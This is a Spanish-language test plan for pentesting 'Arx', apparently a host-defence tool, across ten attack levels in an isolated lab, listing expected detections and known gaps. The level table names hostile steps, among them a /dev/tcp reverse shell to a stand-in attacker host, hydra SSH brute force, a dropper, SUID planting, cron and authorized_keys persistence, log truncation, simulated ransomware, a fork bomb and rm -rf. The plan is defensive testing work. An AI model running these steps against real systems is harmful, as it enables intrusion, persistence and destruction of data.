# Laboratorio de pentesting de Arx — niveles 1 a 10

**Propósito:** probar Arx en "modo real" — atacar un entorno aislado donde Arx defiende,
desde lo más trivial hasta intentar destruirlo — y medir exactamente qué detecta, qué
contiene y qué se le escapa. Los huecos encontrados aquí se convierten en trabajo del
roadmap; nada se maquilla.

**Reglas de compromiso (ROE):** solo contra el entorno de laboratorio (red aislada,
sin salida a internet en el mini-lab Docker; VLAN host-only en la VM). Snapshot limpio
antes de cada nivel destructivo. Nunca herramientas del lab contra terceros.

---

## Entornos

### A. Mini-lab Docker (rápido; niveles 1–6 y regresiones)

Dos contenedores en una red interna sin salida:

```bash
docker network create --internal arx-lab
# Víctima: Ubuntu 22.04 privilegiada + Arx instalado (deb o fuente), baseline sellada
# Atacante: kalilinux/kali-rolling con nmap/hydra/netcat
```

Limitaciones honestas: sin systemd ni auditd completos → los sensores de Arx degradan a
los colectores base (/proc, puertos, integridad, canarios). Sirve para iterar rápido,
no como veredicto final.

### B. VM real (niveles 7–10 y validación definitiva)

- VM Ubuntu 22.04 en UTM/Parallels/VMware (el Mac) o VirtualBox, red host-only.
- **Snapshot "oro":** Arx instalado, `setup` hecho, baseline aprendida y sellada,
  canarios plantados, `arx service install --enforce` activo.
- Atacante: otra VM (Kali) en la misma red host-only.
- Restaurar el snapshot oro entre niveles. En el nivel 10 SE ESPERA destruir la VM.

### C. Range cloud (futuro)

Par de VPS desechables para tráfico real saliente del atacante (TOR, C2 público de
laboratorio). Solo cuando A y B estén verdes.

---

## Los 10 niveles

| Nivel | Ataque (procedimiento) | Comportamiento esperado de Arx | Pasa si… |
|---|---|---|---|
| **1 — Reconocimiento** | `nmap -sS -sV -p-` desde el atacante | Detectar el escaneo (sensor de red) y elevar vigilancia | **HOY: GAP conocido** — sin sensor SYN; queda documentado y agenda el sensor de red |
| **2 — Fuerza bruta** | `hydra ssh://victima` con diccionario | Tormenta de fallos en auth.log → alerta + (futuro) tarpit | **Parcial hoy** — depende del colector de auth.log; si no hay hallazgo, es gap |
| **3 — Credencial débil** | Login SSH con usuario nuevo/credencial por defecto | `login_users` fuera de baseline → hallazgo high | Hallazgo nuevo registrado y alertado |
| **4 — Explotación de servicio** | App web vulnerable plantada (RCE) → el atacante abre un listener nuevo (p. ej. 4444) | Puerto nuevo → Tier 1: bloqueo firewall REAL + registro | Regla de bloqueo visible (ufw/nft) y auto-expira |
| **5 — Dropper** | Descargar "malware" a `/tmp`, `chmod +x`, ejecutarlo | Ejecutable nuevo en dir sospechoso (high) → **SIGSTOP** inmediato | Proceso en estado T; SIGCONT al expirar; reaparición → Tier 2 |
| **6 — Reverse shell** | `bash -i >& /dev/tcp/atacante/4444` desde la víctima | Conexión saliente anómala + proceso hijo raro | **GAP parcial hoy** — necesita sensor de conexiones (Falco/ss); documentado |
| **7 — Escalada** | Plantar binario SUID nuevo (`chmod u+s`) | Barrido SUID + integridad → **crit** | Hallazgo crit en el siguiente barrido SUID |
| **8 — Persistencia** | Entrada en cron/systemd/`authorized_keys` | Integridad drift → **crit → Tier 2** (humano decide) | Pendiente Tier 2 creado; nada se revierte solo |
| **9 — Anti-forense** | Truncar logs + leer ficheros sensibles (señuelos) | Canary: lectura detectada (alta, one-shot); truncado de log | Canary ✓; truncado: **gap parcial** (el cursor detecta rotación, no silencio) |
| **10 — Destrucción total** | Ransomware simulado (cifrado masivo en árbol señuelo) + fork bomb + `rm -rf` sobre señuelos; en VM | **El freno de seguridad salta**: Arx deja de actuar tras 5 acciones/hora, escala todo a humano, alerta crítica masiva | Breaker disparado + alertas emitidas + nada irreversible hecho por Arx; la VM puede morir — por eso es VM |

**Criterio de nivel superado:** el comportamiento esperado ocurre Y queda evidencia en
`incidents.jsonl` / `arx status`. Un nivel en GAP no es un fracaso del lab: es el mapa
honesto de lo que falta construir (y cada gap ya tiene fase en el roadmap).

---

## Ejecución

```bash
lab/docker-lab.sh        # mini-lab: niveles 3,4,5,7,8,9 (los que hoy deben pasar)
lab/run-levels.sh N      # un nivel concreto dentro de la víctima
```

El scoreboard imprime PASS/GAP por nivel. Los niveles 1, 2 y 6 requieren el atacante
separado (red interna Docker o VM Kali) y/o sensores que aún no existen — se documentan
como GAP hasta su fase.
